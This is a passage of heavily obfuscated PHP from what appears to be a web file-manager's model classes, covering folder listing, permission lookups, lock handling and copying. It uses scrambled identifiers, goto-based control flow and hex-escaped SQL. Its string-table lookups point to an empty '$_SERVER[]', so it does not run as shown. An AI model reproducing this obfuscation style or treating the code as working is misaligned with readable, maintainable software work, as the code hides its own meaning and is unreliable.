$B׶ = Model($A׿[423])->field($A׿[424])->where($B)->select(); goto dø; AחÊ: foreach ($B򐼠 as &$Fګ) { goto e˒; Aױφ: unset($BӺܟ[$D̽][$A׿[75]]); $fיᄯ = is_array($fڙ[$D̽]) ? $fڙ[$D̽] : array(); $Fګ[$A׿[162]] = array_merge($fיᄯ, $BӺܟ[$D̽]); goto F۞; c͙Ԍ: $eǏ[$A׿[77]] = $Fګ[$A׿[77]]; $eǏ[$A׿[28]] = $Fګ[$A׿[28]]; self::$cacheFileInfo[$A׿[425] . $D̽] = $eǏ; goto Aױφ; F۞: if (isset($Fګ[$A׿[162]][$A׿[426]])) { $Fګ[$A׿[426]] = json_decode($Fګ[$A׿[162]][$A׿[426]], !0); unset($Fګ[$A׿[162]][$A׿[426]]); } goto A䉄; e˒: $D̽ = $Fګ[$A׿[419]]; if (!$D̽ || !isset($BӺܟ[$D̽])) { continue; } $eǏ = $BӺܟ[$D̽]; goto c͙Ԍ; A䉄: } goto e܌; D߽: $A׿ =& $_SERVER[]; $Dť = array_to_keyvalue($B򐼠, $A׿[33], $A׿[419]); $Dť = array_filter(array_unique($Dť)); goto e٨; dø: $B׶ = $B׶ ? $B׶ : array(); $fڙ = array(); foreach ($B׶ as $Bߔ) { if (!isset($fڙ[$Bߔ[$A׿[419]]])) { $fڙ[$Bߔ[$A׿[419]]] = array(); } $fڙ[$Bߔ[$A׿[419]]][$Bߔ[$A׿[89]]] = $Bߔ[$A׿[359]]; } goto AחÊ; e܌: } protected function _listAppendSourceInfo(&$Bҕ, $ḅ) { goto a; A: $Bᦰ = array_to_keyvalue($cߓ, $C惩[367]); $B񗫼 = array_to_keyvalue_group($Fф, $C惩[75], $C惩[393]); $c̰陕 = array_to_keyvalue($b˝, $C惩[75]); goto Aउ; a: $C惩 =& $_SERVER[]; if (!defined($C惩[427])) { return; } $cߓ = Model($C惩[428])->listData(); goto b򫌌; Aउ: $aɥ撅 = array_to_keyvalue_group($A悉, $C惩[369]); foreach ($Bҕ as &$B嗆Ч) { $B嗆Ч[$C惩[391]] = array($C惩[430] => 0, $C惩[431] => 0, $C惩[432] => 0); if (isset($c̰陕[$B嗆Ч[$C惩[369]]])) { $B嗆Ч[$C惩[391]][$C惩[433]] = 1; $B嗆Ч[$C惩[391]][$C惩[434]] = $c̰陕[$B嗆Ч[$C惩[369]]][$C惩[28]]; } if (isset($B񗫼[$B嗆Ч[$C惩[369]]])) { $B嗆Ч[$C惩[391]][$C惩[435]] = array(); foreach ($B񗫼[$B嗆Ч[$C惩[369]]] as $FΏ) { $b̅ = $Bᦰ[$FΏ]; $B嗆Ч[$C惩[391]][$C惩[435]][] = array($C惩[436] => $b̅[$C惩[367]], $C惩[386] => $b̅[$C惩[28]], $C惩[437] => $b̅[$C惩[438]]); } } if (isset($aɥ撅[$B嗆Ч[$C惩[369]]])) { $B嗆Ч[$C惩[391]][$C惩[439]] = array(); foreach ($aɥ撅[$B嗆Ч[$C惩[369]]] as $Aэ) { $B嗆Ч[$C惩[391]][$C惩[439]] = array($C惩[440] => $Aэ[$C惩[441]], $C惩[442] => $Aэ[$C惩[443]], $C惩[444] => $Aэ[$C惩[369]], $C惩[445] => $Aэ[$C惩[446]], $C惩[447] => $Aэ[$C惩[448]], $C惩[449] => $Aэ[$C惩[449]], $C惩[450] => $Aэ[$C惩[450]]); } } } return $Bҕ; goto C; b򫌌: $Fф = Model($C惩[392])->listData(); $b˝ = Model($C惩[381])->listData(); $A悉 = Model($C惩[429])->listSimple(); goto A; C: } protected function _listAppendChildren(&$fꇡ, $F) { goto B; Bј: foreach ($fꇡ as &$A˚Ҹ) { if ($A˚Ҹ[$E[370]]) { unset($A˚Ҹ[$E[372]]); $A˚Ҹ[$E[192]] = intval($cǔ󐗐[$A˚Ҹ[$E[369]] . $E[453]][$E[454]]); $A˚Ҹ[$E[191]] = intval($cǔ󐗐[$A˚Ҹ[$E[369]] . $E[455]][$E[454]]); } } goto bӭ󢰫; c: $C䰋 = $this->tablePrefix . $this->tableName; for ($A = 0; $A < $Dꬷ٦; $A++) { $f֟ = intval($fꇡ[$A][$E[397]]); if ($fꇡ[$A][$E[370]]) { $B׃칉 = $fꇡ[$A][$E[369]]; $c܇ܮ .= "\x53\x45\x4c\x45\x43\x54\x20\52\x20\106\122\117\115\x20\x28\x53\x45\x4c\x45\x43\x54\40\47{$B׃칉}\137\150\x61\x73\106\151\x6c\x65\x27\40\x61\x73\40\x68\141\163\54\143\x6f\x75\x6e\x74\x28\61\51\40\x61\163\x20\150\x61\163\103\x6f\x75\x6e\164\x20\106\122\117\115\40\x60{$C䰋}\x60\x20\xa\11\11\11\x9\x9\167\150\145\162\145\x20\x70\x61\162\145\156\164\111\104\x3d{$B׃칉}\40\x61\156\144\40\151\163\106\x6f\x6c\x64\x65\162\75\60\40\x61\156\x64\40\x69\x73\104\x65\x6c\x65\164\x65\75{$f֟}\x29\x20\141\x73\40\x74\142\x31\x5f{$B׃칉}\40\x75\x6e\151\x6f\156\x20\x61\154\x6c\40\xa\11\x9\x9\11\x9\x53\105\114\105\x43\124\40\52\40\106\x52\117\115\40\50\x53\105\x4c\x45\103\x54\40\47{$B׃칉}\137\150\141\x73\x46\157\154\x64\x65\x72\x27\x20\141\163\x20\x68\x61\x73\106\x69\x6c\145\x2c\143\157\x75\x6e\x74\x28\61\51\40\x61\x73\x20\150\141\163\103\157\165\x6e\164\40\x46\x52\117\x4d\x20\140{$C䰋}\140\40\xa\11\11\x9\x9\11\167\x68\x65\162\x65\x20\x70\141\162\145\x6e\164\111\x44\75{$B׃칉}\x20\x61\x6e\x64\x20\x69\163\106\157\154\x64\145\x72\x3d\x31\40\141\x6e\144\x20\151\x73\104\145\154\145\x74\145\75{$f֟}\51\x20\x61\163\x20\x74\142\x32\x5f{$B׃칉}\40\x75\156\151\x6f\x6e\40\x61\x6c\154\40"; } if ((strlen($c܇ܮ) >= $b鋶 || $A == $Dꬷ٦ - 1) && $c܇ܮ) { $c܇ܮ = substr($c܇ܮ, 0, -strlen($E[451])); $fӊ = $this->query($c܇ܮ); $cǔ󐗐 = array_merge($cǔ󐗐, $fӊ); $c܇ܮ = $E[33]; } } $cǔ󐗐 = array_to_keyvalue($cǔ󐗐, $E[452]); goto Bј; B: $E =& $_SERVER[]; $c܇ܮ = $E[361]; $cǔ󐗐 = array(); goto Fڎꂔ; Fڎꂔ: $b鋶 = 1024 * 50; $fꇡ = is_array($fꇡ) ? $fꇡ : array(); $Dꬷ٦ = count($fꇡ); goto c; bӭ󢰫: } protected function _listAppendAuth(&$fޟվ) { goto EԻ; EԻ: $aڐƃô =& $_SERVER[]; if (!defined($aڐƃô[427])) { return; } $aڈ𢌶 = array(); goto dƏ; C: $F = Model($aڐƃô[456])->getSourceList($aڈ𢌶, $bǍ); foreach ($fޟվ as $d => &$Fݘκ㳔) { $Fݘκ㳔[$aڐƃô[376]] = $F[$Fݘκ㳔[$aڐƃô[369]]]; if (!$Fݘκ㳔[$aڐƃô[376]] && $Fݘκ㳔[$aڐƃô[371]] == self::TYPE_GROUP) { $Fݘκ㳔[$aڐƃô[376]] = Action($aڐƃô[457])->pathGroupAuthMake($Fݘκ㳔[$aڐƃô[458]]); if (!$Fݘκ㳔[$aڐƃô[376]] && !_get($GLOBALS, $aڐƃô[459])) { $Fݘκ㳔[$aڐƃô[189]] = !1; $Fݘκ㳔[$aڐƃô[188]] = !1; } } if ($Fݘκ㳔[$aڐƃô[376]]) { $Fݘκ㳔[$aڐƃô[189]] = AuthModel::authCheckEdit($Fݘκ㳔[$aڐƃô[376]][$aڐƃô[377]]); $Fݘκ㳔[$aڐƃô[188]] = AuthModel::authCheckView($Fݘκ㳔[$aڐƃô[376]][$aڐƃô[377]]); } $this->groupPathDisplay($Fݘκ㳔); } goto E; dƏ: foreach ($fޟվ as $Fݘκ㳔) { if ($Fݘκ㳔[$aڐƃô[371]] == self::TYPE_GROUP) { $aڈ𢌶[] = $Fݘκ㳔[$aڐƃô[369]]; } } if (!$aڈ𢌶) { return; } $bǍ = array_to_keyvalue($fޟվ, $aڐƃô[369]); goto C; E: } public function groupPathDisplay(&$F) { goto b҃; b҃: $Cܩ =& $_SERVER[]; if ($F[$Cܩ[371]] != self::TYPE_GROUP) { return; } $B = Model($Cܩ[460])->getInfo($F[$Cܩ[458]]); goto a; a: $CҚ = $this->parentLevelArray($B[$Cܩ[461]]); $CՈ = $Cܩ[33]; foreach ($CҚ as $d譻) { $Fٌ = Model($Cܩ[460])->getInfo($d譻); $CՈ .= $Fٌ[$Cܩ[391]][$Cܩ[369]] . $Cܩ[47]; } goto eꔍΨ; eꔍΨ: $F[$Cܩ[462]] = $B[$Cܩ[463]]; $F[$Cܩ[380]] = $B[$Cܩ[461]]; $F[$Cܩ[464]] = $B[$Cܩ[465]]; goto eଡ଼; eଡ଼: $F[$Cܩ[466]] = $CՈ . $B[$Cܩ[391]][$Cܩ[369]]; goto b; b: } protected function _listAppendPath(&$C) { goto Fȥ牊; E⃫: $EĞ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($C as &$dՙĤ) { goto C¯; eװ: $f = trim($dՙĤ[$fɖ[468]], $fɖ[8]); if ($dՙĤ[$fɖ[463]] == $fɖ[470] && $f) { $dՙĤ[$fɖ[28]] = $f; } $this->_listAppendPathRecycle($dՙĤ, $b, $EĞ); goto E; A: if ($b) { $C .= $dՙĤ[$fɖ[28]]; } if ($dՙĤ[$fɖ[370]]) { $C .= $fɖ[8]; } $dՙĤ[$fɖ[468]] = str_replace($fɖ[469], $fɖ[8], $C); goto eװ; C¯: $b = $this->parentLevelArray($dՙĤ[$fɖ[461]]); $C = $this->_listAppendPathRoot($dՙĤ, $b); foreach ($b as $d) { if (isset($cܘ[$d])) { $C .= $cܘ[$d] . $fɖ[8]; } } goto A; E: } goto FЇ; e꼑Ĺ: $Bд = array(); foreach ($cܘ as $AՐǿ => $e) { if (!$e) { $Bд[] = $AՐǿ; } } if ($Bд) { $bک = array($fɖ[383] => array($fɖ[384], $Bд)); if (count($Bд) == 1) { $D¿ = $this->sourceInfo($Bд[0]); $D¿ = is_array($D¿) ? array($D¿) : !1; } else { $D¿ = $this->field($fɖ[467])->where($bک)->select(); } $a = array_to_keyvalue($D¿, $fɖ[369], $fɖ[28]); $cܘ = array_merge_index($cܘ, $a); } goto E⃫; Fȥ牊: $fɖ =& $_SERVER[]; $cܘ = array(); foreach ($C as &$dՙĤ) { $cܘ[$dՙĤ[$fɖ[369]]] = $dՙĤ[$fɖ[28]]; $b = $this->parentLevelArray($dՙĤ[$fɖ[461]]); array_shift($b); foreach ($b as $d) { if (!isset($cܘ[$d])) { $cܘ[$d] = 0; } } } goto e꼑Ĺ; FЇ: } private function _listAppendPathRecycle(&$A, $f, $f쩿) { goto F׋ѭ; C܊: $A[$fǴ[461]] = $fǴ[472] . implode($fǴ[47], array_slice($f, 1)) . $fǴ[47]; if ($A[$fǴ[369]] == $f쩿) { $A[$fǴ[461]] = $fǴ[472]; $A[$fǴ[463]] = $fǴ[470]; $A[$fǴ[28]] = LNG($fǴ[471]); } $A[$fǴ[473]] = $fǴ[474]; goto f陋; Dֲ: $dҽ = explode($fǴ[8], trim($A[$fǴ[468]], $fǴ[8])); $c܊ = implode($fǴ[8], array_slice($dҽ, 2)); $A[$fǴ[468]] = $fǴ[8] . LNG($fǴ[471]) . $fǴ[8] . ltrim($c܊, $fǴ[8]); goto C܊; F׋ѭ: $fǴ =& $_SERVER[]; if (intval($A[$fǴ[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($f쩿, $f) && $A[$fǴ[369]] != $f쩿) { return; } goto Dֲ; f陋: } protected function _listAppendPathRoot(&$f, $f白) { $D =& $_SERVER[]; $bϛ = $D[33]; if ($f[$D[371]] == self::TYPE_USER) { if (defined($D[427]) && $f[$D[458]] == USER_ID) { $bϛ = LNG($D[475]); if (!$f白) { $f[$D[28]] = $bϛ; } } else { $aÚ = Model($D[476])->getInfoSimple($f[$D[458]]); $bϛ = LNG($D[477]) . $D[157] . $aÚ[$D[28]] . $D[478]; } } else { if ($f[$D[371]] == self::TYPE_GROUP) { $aÚ = Model($D[460])->getInfoSimple($f[$D[458]]); $bϛ = $aÚ[$D[28]]; } else { if ($f[$D[371]] == self::TYPE_SYSTEM) { $aÚ = $this->sourceInfo($f白[0], !0); $bϛ = $aÚ[$D[28]]; } } } $bϛ = $bϛ ? $D[8] . $bϛ . $D[8] : $D[8]; return $bϛ; } protected function _listAppendUser(&$aٯ) { $a̕ބ =& $_SERVER[]; $fӄ = array_to_keyvalue($aٯ, $a̕ބ[33], $a̕ބ[378]); $c䝰 = array_to_keyvalue($aٯ, $a̕ބ[33], $a̕ބ[379]); $Bê׆ = array_merge($fӄ, $c䝰); $Eџ = Model($a̕ބ[479])->userListInfo($Bê׆); foreach ($aٯ as &$AǸ) { $DԼ߳ = $AǸ[$a̕ބ[378]]; $AǸ[$a̕ބ[378]] = $Eџ[$DԼ߳] ? $Eџ[$DԼ߳] : !1; $DԼ߳ = $AǸ[$a̕ބ[379]]; $AǸ[$a̕ބ[379]] = $Eџ[$DԼ߳] ? $Eџ[$DԼ߳] : !1; if (isset($AǸ[$a̕ބ[417]]) && $AǸ[$a̕ބ[417]][$a̕ބ[480]]) { $c☜ = $GLOBALS[$a̕ބ[6]][$a̕ބ[84]][$a̕ބ[481]]; if ($AǸ[$a̕ބ[417]][$a̕ބ[482]] <= time() - $c☜) { $this->metaSet($AǸ[$a̕ބ[369]], $a̕ބ[480], null); $this->metaSet($AǸ[$a̕ބ[369]], $a̕ބ[482], null); unset($AǸ[$a̕ބ[417]][$a̕ބ[480]]); continue; } $dơ = $AǸ[$a̕ބ[417]][$a̕ބ[480]]; $AǸ[$a̕ބ[417]][$a̕ބ[483]] = Model($a̕ބ[479])->getInfoSimpleOuter($dơ); } } } public function parentLevelArray($Eʜ؄) { $Cڗ =& $_SERVER[]; $Eʜ؄ = explode($Cڗ[47], trim($Eʜ؄, $Cڗ[47])); return array_remove_value($Eʜ؄, $Cڗ[470]); } public function listAll($F) { goto Fɿ; cǄ: $this->_listAppendAuth($fܨĝ); $this->_listAppendUser($fܨĝ); $this->_listAppendPath($fܨĝ); goto aͯ; aͯ: $fܨĝ = array_to_keyvalue($fܨĝ, $D˗[369]); $Fۚ荆 = "\57{$B㐣×[$D˗[28]]}\x2f"; $Fۚ荆 = $Fۚ荆 == $D˗[469] ? $D˗[8] : $Fۚ荆; goto AՉك; F҅: $dٽ = $D˗[488]; $DپΕ͹ = "\x4c\x45\x46\x54\x20\112\117\111\116\x20{$this->tablePrefix}\x69\157\137\146\151\154\x65\x20\146\x69\x6c\x65\x20\157\156\x20\x73\157\165\162\x63\145\x2e\146\151\154\x65\111\x44\x20\75\40\x66\x69\154\x65\x2e\x66\151\154\145\111\x44"; $fܨĝ = $this->alias($D˗[489])->field($dٽ)->where($C腕ڭ)->join($DپΕ͹)->select(); goto cǄ; AՉك: $cÎ = array(); foreach ($fܨĝ as $Eɋ => $Bң) { goto A; a: for ($d΃ = 0; $d΃ < count($aԖ); $d΃++) { $aȎ .= $fܨĝ[$aԖ[$d΃]][$D˗[28]] . $D˗[8]; } $aȎ .= $Bң[$D˗[28]]; if ($Bң[$D˗[370]]) { $aȎ .= $D˗[8]; } goto b㈸; A: $aԖ = $this->parentLevelArray($Bң[$D˗[461]]); array_shift($aԖ); $aȎ = $Fۚ荆; goto a; b㈸: $aȎ = str_replace($D˗[469], $D˗[8], $aȎ); $aȎ = str_replace($D˗[469], $D˗[8], $aȎ); $d㫥ս = array($D˗[387] => str_replace($D˗[469], $D˗[8], $aȎ), $D˗[490] => intval($Bң[$D˗[370]]), $D˗[391] => $this->pathInfoFilter($Bң, !0)); goto dО݋; dО݋: if (!$Bң[$D˗[370]]) { $d㫥ս[$D˗[419]] = $Bң[$D˗[419]]; $d㫥ս[$D˗[491]] = $Bң[$D˗[75]]; } $cÎ[] = $d㫥ս; goto Cꃑ; Cꃑ: } return $cÎ; goto Aܡ; Fɿ: $D˗ =& $_SERVER[]; $B㐣× = $this->sourceInfo($F); $C腕ڭ = array($D˗[484] => array($D˗[485], $B㐣×[$D˗[461]] . $F . $D˗[486]), $D˗[487] => 0); goto F҅; Aܡ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($e) { goto bտ; eן: $c = 1; $this->_lockEvent($e, array($d[493], $d[494]), $c); $this->_lockParent($e, array($d[494]), $c); goto DÎЩ; bտ: $d =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($d[492], $e); goto eן; DÎЩ: $this->_lockEvent($e, array($d[495], $d[496]), $c); $this->_lockCheckEnd($d[492], $e); goto E͑횎; E͑횎: } public function lockCopyEnd($cֈ) { $cɼ =& $_SERVER[]; if (!$this->allowLock()) { return; } $CאВ͊ = 0; $this->_lockEvent($cֈ, array($cɼ[493], $cɼ[494]), $CאВ͊); $this->_lockParent($cֈ, array($cɼ[494]), $CאВ͊); $this->_lockEvent($cֈ, array($cɼ[495], $cɼ[496]), $CאВ͊); } public function lockWriteStart($C۰, $DԾ = '') { goto C; D侞: $this->_lockParent($C۰, array($b[492], $b[494]), $c쥂); $this->_lockCheckEnd($b[493], $C۰); goto E; C: $b =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($b[493], $C۰); goto aֶ; aֶ: $c쥂 = 1; $this->_lockKey($b[497] . $C۰ . $b[91] . $DԾ, $c쥂); $this->_lockEvent($C۰, array($b[492], $b[494]), $c쥂); goto D侞; E: } public function lockWriteEnd($C̮, $C = '') { $BԘ =& $_SERVER[]; if (!$this->allowLock()) { return; } $b֢Б = 0; $this->_lockKey($BԘ[497] . $C̮ . $BԘ[91] . $C, $b֢Б); $this->_lockEvent($C̮, array($BԘ[492], $BԘ[494]), $b֢Б); $this->_lockParent($C̮, array($BԘ[492], $BԘ[494]), $b֢Б); } public function lockMoveStart($C) { goto Fۆ; bڤ: $this->_lockParent($C, array($bϩ[492], $bϩ[494]), $D); $this->_lockEvent($C, array($bϩ[499], $bϩ[495], $bϩ[496]), $D); $this->_lockCheckEnd($bϩ[494], $C); goto a΂Ҡ; A럊: $D = 1; $this->_lockKey($bϩ[498] . $C, $D); $this->_lockEvent($C, array($bϩ[492], $bϩ[493]), $D); goto bڤ; Fۆ: $bϩ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($bϩ[494], $C); goto A럊; a΂Ҡ: } public function lockMoveEnd($d򖝜) { goto cȔׅ; cȔׅ: $Aۂ =& $_SERVER[]; if (!$this->allowLock()) { return; } $eٕ = 0; goto Aᮿ; Aᮿ: $this->_lockKey($Aۂ[498] . $d򖝜, $eٕ); $this->_lockEvent($d򖝜, array($Aۂ[492], $Aۂ[493]), $eٕ); $this->_lockParent($d򖝜, array($Aۂ[492], $Aۂ[494]), $eٕ); goto b鼎ɫ; b鼎ɫ: $this->_lockEvent($d򖝜, array($Aۂ[499], $Aۂ[495], $Aۂ[496]), $eٕ); goto E; E: } private function _lockCheck($fē, $AͰÕ) { goto dϊˢ; dϊˢ: $b =& $_SERVER[]; $cׅ× = $this->sourceInfo($AͰÕ); $Fȍ = $fē . $b[91] . $AͰÕ; goto f§; f: $A = array_reverse($this->parentLevelArray($cׅ×[$b[461]])); foreach ($A as $f) { $Fȍ = $fē . $b[501] . $f; if (CacheLock::lockGet($b[502] . $Fȍ)) { $cׅ× = $this->sourceInfo($f); CacheLock::setErrorMsg($b[157] . htmlspecialchars($cׅ×[$b[28]]) . $b[478] . $e); $this->_lockKey($Fȍ, 1); $this->_lockKey($Fȍ, 0); } } goto EΘ; f§: $this->_lockTimeStart[$Fȍ] = timeFloat(); if (!is_array($cׅ×)) { return; } $e = LNG($b[500]); goto d; d: CacheLock::setErrorMsg($b[157] . htmlspecialchars($cׅ×[$b[28]]) . $b[478] . $e); $this->_lockKey($Fȍ, 1); $this->_lockKey($Fȍ, 0); goto f; EΘ: } private function _lockCheckEnd($d齹, $e) { goto a྆; e: if ($bü > 0.5) { unset(self::$cacheSourceInfo[$fׇ[410] . $e]); } $eّ = $this->sourceInfo($e); if (!$eّ) { show_json(LNG($fׇ[101]), !1); } goto Eʉܟ; a྆: $fׇ =& $_SERVER[]; $Dӎ = $d齹 . $fׇ[91] . $e; CacheLock::setErrorMsg($fׇ[361]); goto E®͎; E®͎: if (!isset($this->_lockTimeStart[$Dӎ])) { return; } $bü = timeFloat() - $this->_lockTimeStart[$Dӎ]; unset($this->_lockTimeStart[$Dӎ]); goto e; Eʉܟ: } private function _lockParent($cѤ, $e, $E眍̥) { if (!$this->autoLockSet) { return; } $a񖏹 = $this->sourceInfo($cѤ); if (!is_array($a񖏹)) { return; } $B彲 = array_reverse($this->parentLevelArray($a񖏹[$_SERVER[][461]])); foreach ($B彲 as $Cͪ) { $this->_lockEvent($Cͪ, $e, $E眍̥); } } private function _lockEvent($Aʡɬ, $D󲢢, $Cᦇ) { $DŻ =& $_SERVER[]; if (!$this->autoLockSet) { return; } foreach ($D󲢢 as $e֗) { $cՖՅ = $e֗ . $DŻ[91] . $Aʡɬ; if ($Cᦇ && CacheLock::lockGet($DŻ[502] . $cՖՅ)) { continue; } $this->_lockKey($cՖՅ, $Cᦇ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($aˎ, $eᚻ = 1) { $f˸˶ = $_SERVER[][502] . md5($aˎ); if ($eᚻ) { if (isset(self::$_lockItemArr[$f˸˶])) { return; } self::$_lockItemArr[$f˸˶] = 1; CacheLock::lock($f˸˶, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$f˸˶])) { return; } unset(self::$_lockItemArr[$f˸˶]); CacheLock::unlock($f˸˶); } } public function isParentOf($Eڙڋ, $B) { goto E; c㦒: return $c; goto Eӝ; cͨඏ: $A = $Aݳ[$Aݝ[461]] . $Aݳ[$Aݝ[369]] . $Aݝ[47]; $dÏܩ = $A጗գ[$Aݝ[461]] . $A጗գ[$Aݝ[369]] . $Aݝ[47]; $c = strpos($dÏܩ, $A) === 0; goto c㦒; E: $Aݝ =& $_SERVER[]; $Aݳ = $this->sourceInfo($Eڙڋ); $A጗գ = $this->sourceInfo($B); goto cͨඏ; Eӝ: } private $targetIsDelete = 0; public function copy($dŸظ, $c, $b擉 = REPEAT_REPLACE, $Dц = '') { goto Cڑ; Aڸ⒑: $this->updateModifyTime($c); return $Bϊ; goto cƋӑ; aۡȧ: $this->targetIsDelete = intval($dӬ[$BŤ[397]]); $DҮ = $this->fileNameExistCache($c, $dӬ[$BŤ[28]]); $Bϊ = $this->_copy($dŸظ, $c, $b擉, $fܣ, !0, $Dц); goto f; bԋޤ: if ($dӬ[$BŤ[370]] == $BŤ[83] && $DҮ == $Bϊ) { $this->folderSizeResetChildren($DҮ); } Model($BŤ[506])->addAll($fܣ[$BŤ[504]], array(), !0); if ($DҮ != $Bϊ || $dӬ[$BŤ[370]] == $BŤ[83]) { Model($BŤ[507])->eventCopy($Bϊ); } goto c; f: $this->_childrenListClear(); $this->lockCopyEnd($dŸظ); $this->lockWriteEnd($c, $fᕫ); goto bԋޤ; e: if (!$dӬ || !$bߛ || $bߛ[$BŤ[370]] != $BŤ[83]) { return !1; } if ($this->isParentOf($dŸظ, $c)) { return !1; } $fᕫ = $Dц ? $Dц : $dӬ[$BŤ[28]]; goto cߍޣų; cߍޣų: $this->lockCopyStart($dŸظ); $this->lockWriteStart($c, $fᕫ); $fܣ = array($BŤ[503] => array(), $BŤ[504] => array(), $BŤ[505] => array()); goto aۡȧ; Cڑ: $BŤ =& $_SERVER[]; $dӬ = $this->sourceInfo($dŸظ); $bߛ = $this->sourceInfo($c); goto e; c: $this->saveAll($fܣ[$BŤ[505]]); Model($BŤ[167])->linkAdd($fܣ[$BŤ[503]]); $this->folderSizeReset($c); goto Aڸ⒑; cƋӑ: } private function _copy($Dꨎ, $dŶ, $F, &$bƔ, $A¬Ӻ, $dӜ֡ = '') { goto C; bЛي: return $Fﻅ; goto dη; e͏: if (!$E՝ܴ) { return $this->_copyCreate($Dꨎ, $dŶ, $CϻÅ, $bƔ); } $Fﻅ = $E՝ܴ; if ($f֐) { if ($F == REPEAT_RENAME_FOLDER) { $CϻÅ = $this->fileNameAutoCache($dŶ, $CϻÅ, $F, $f֐); $Fﻅ = $this->_copyCreate($Dꨎ, $dŶ, $CϻÅ, $bƔ); } else { $BΝ򿈄 = $this->_childrenList($Dꨎ); foreach ($BΝ򿈄 as $Cڨ) { $this->_copy($Cڨ[$fْ笨[369]], $E՝ܴ, $F, $bƔ, !1); } } } else { if ($F == REPEAT_RENAME || $F == REPEAT_RENAME_FOLDER) { $CϻÅ = $this->fileNameAutoCache($dŶ, $CϻÅ, $F, $f֐); $Fﻅ = $this->_copyCreate($Dꨎ, $dŶ, $CϻÅ, $bƔ); } else { if ($F == REPEAT_REPLACE) { $E = $this->sourceInfoCache($E՝ܴ); $eܡ = $this->fileHistory($E, $dڍ[$fْ笨[419]], $dڍ[$fْ笨[77]]); if ($eܡ) { $bƔ[$fْ笨[503]][] = $dڍ[$fْ笨[419]]; } } else { if ($F == REPEAT_SKIP) { } } } Hook::trigger($fْ笨[508], array($fْ笨[509], $dڍ, 0)); } goto bЛي; C: $fْ笨 =& $_SERVER[]; $dڍ = $this->sourceInfoCache($Dꨎ); $f֐ = $dڍ[$fْ笨[370]] == $fْ笨[83]; goto A; A: $CϻÅ = $dӜ֡ ? $dӜ֡ : $dڍ[$fْ笨[28]]; $E՝ܴ = $this->fileNameExistCache($dŶ, $CϻÅ); if ($A¬Ӻ) { $this->_childrenAllMake($Dꨎ); if ($f֐ && $E՝ܴ) { $this->_childrenAllMake($E՝ܴ); } } goto e͏; dη: } private function _copyCreate($A朅, $Dʿ, $cǧ, &$E臨) { goto Eݏ꛰; aֱ: $AƓ = $this->_makeItemData($B㿭, $b, $cǧ); Hook::trigger($E[510], $AƓ); Hook::trigger($E[511], array($E[512], $AƓ, 0)); goto Eⷵ; Eҳ: foreach ($D罧 as $d) { $cȴ = $d[$E[369]]; $E¾ = $this->_childrenMatch($aమ, $d, $c弙); $a[] = array($E[369], $cȴ, $E[463], $E¾[$E[463]]); $Fޛ[] = array($E[369], $cȴ, $E[461], $E¾[$E[461]]); $this->_copyApplyMeta($d, $E臨); if ($d[$E[370]] != $E[83]) { $E臨[$E[503]][] = $d[$E[419]]; } } $this->chunkEventSet($E[515], array($E[516], $AƓ, $B٭焓)); $this->saveAll($a); goto CϬ; CϬ: $this->chunkEventSet($E[517], array($E[518], $AƓ, $B٭焓)); $this->saveAll($Fޛ); return $A磻; goto E¬; cު: if ($B㿭[$E[370]] != $E[83]) { $E臨[$E[503]][] = $B㿭[$E[419]]; return $A磻; } $D = array(); $B؛ = array(); goto d긅; Eݏ꛰: $E =& $_SERVER[]; $B㿭 = $this->sourceInfoCache($A朅); $b = $this->sourceInfoCache($Dʿ); goto aֱ; EÉ: $aమ[$A朅] = $A磻; $a = array(); $Fޛ = array(); goto Eҳ; EѲ: $this->addAll($B؛, array(), !1); $D罧 = $this->where(array($E[463] => $A磻))->select(); $aమ = $this->_childrenMakeRelation($D, $D罧); goto EÉ; Eⷵ: $A磻 = $this->add($AƓ); $e = array($E[369] => $A磻, $E[28] => $cǧ); $this->_copyApplyMeta($e, $E臨); goto cު; Dڈڱ: $c弙 = $this->sourceInfo($A磻); foreach ($D as $d) { $d = $this->_makeItemData($d, $c弙, $d[$E[28]]); $d[$E[461]] = $d[$E[461]]; $B؛[] = $d; } $this->chunkEventSet($E[513], array($E[514], $AƓ, $B٭焓)); goto EѲ; d긅: $this->_childrenListAll($A朅, $D); $B٭焓 = count($D); if ($B٭焓 == 0) { return $A磻; } goto Dڈڱ; E¬: } private function _childrenMakeRelation($aҪޅъ, $cΫ␞) { $EɆ⏐ =& $_SERVER[]; $b唖 = array(); $E = array(); foreach ($aҪޅъ as $Cﯺ) { $fޜׯ = $Cﯺ[$EɆ⏐[28]] . $EɆ⏐[8] . $Cﯺ[$EɆ⏐[461]]; $b唖[$fޜׯ] = $Cﯺ[$EɆ⏐[369]]; } foreach ($cΫ␞ as $Cﯺ) { $fޜׯ = $Cﯺ[$EɆ⏐[28]] . $EɆ⏐[8] . $Cﯺ[$EɆ⏐[461]]; $B = $b唖[$fޜׯ]; $E[$B] = $Cﯺ[$EɆ⏐[369]]; } return $E; } private function _childrenMatch($c򐈄, $Aڅ, $EέԬ) { goto dΓ; Fͺ: foreach ($F߾ as $A) { if (isset($c򐈄[$A])) { $D򘓨 .= $c򐈄[$A] . $Dۙ[519]; } } $D򘓨 = rtrim($D򘓨, $Dۙ[47]) . $Dۙ[47]; $d̠҆ = $this->parentLevelArray($D򘓨); goto Fװ샄; dΓ: $Dۙ =& $_SERVER[]; $D򘓨 = $EέԬ[$Dۙ[461]]; $F߾ = $this->parentLevelArray($Aڅ[$Dۙ[461]]); goto Fͺ; Fװ샄: $eъ = $d̠҆[count($d̠҆) - 1]; return array($Dۙ[463] => $eъ, $Dۙ[461] => $D򘓨); goto Eن; Eن: } private function _makeItemData($AΧ, $cʴ荫, $dت㏃) { $cϏ̱ =& $_SERVER[]; $a = array($cϏ̱[520] => $AΧ[$cϏ̱[370]], $cϏ̱[386] => $dت㏃, $cϏ̱[521] => $AΧ[$cϏ̱[372]], $cϏ̱[420] => $AΧ[$cϏ̱[419]], $cϏ̱[522] => $AΧ[$cϏ̱[77]], $cϏ̱[523] => $cʴ荫[$cϏ̱[371]], $cϏ̱[524] => $cʴ荫[$cϏ̱[458]], $cϏ̱[525] => USER_ID, $cϏ̱[526] => 